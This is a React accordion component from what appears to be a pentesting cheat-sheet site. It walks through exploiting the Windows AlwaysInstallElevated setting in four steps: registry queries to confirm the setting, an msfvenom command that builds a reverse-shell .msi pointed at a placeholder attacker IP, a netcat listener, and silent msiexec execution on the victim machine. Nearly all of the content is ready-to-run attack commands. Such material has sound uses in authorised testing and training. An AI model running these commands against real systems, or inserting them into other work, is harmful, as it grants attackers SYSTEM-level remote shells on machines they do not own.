import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const AlwaysInstallElevated = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              Allows the user to run and install any .msi file with system level
              privileges.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>
              Check if the AlwaysInstallElevated registry value is set on both
              current user and system.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"
              }
            </SyntaxHighlighter>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>
              Use msfvenom to create a malicious .msi file.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>Start a netcat listener.</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"nc -lvnp 4444"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 4</Typography>
            <Typography>
              Transfer the malicious.msi file to the victim machine and execute
              it to get a reverse shell.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"msiexec /q /i malicious.msi"}
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default AlwaysInstallElevated;
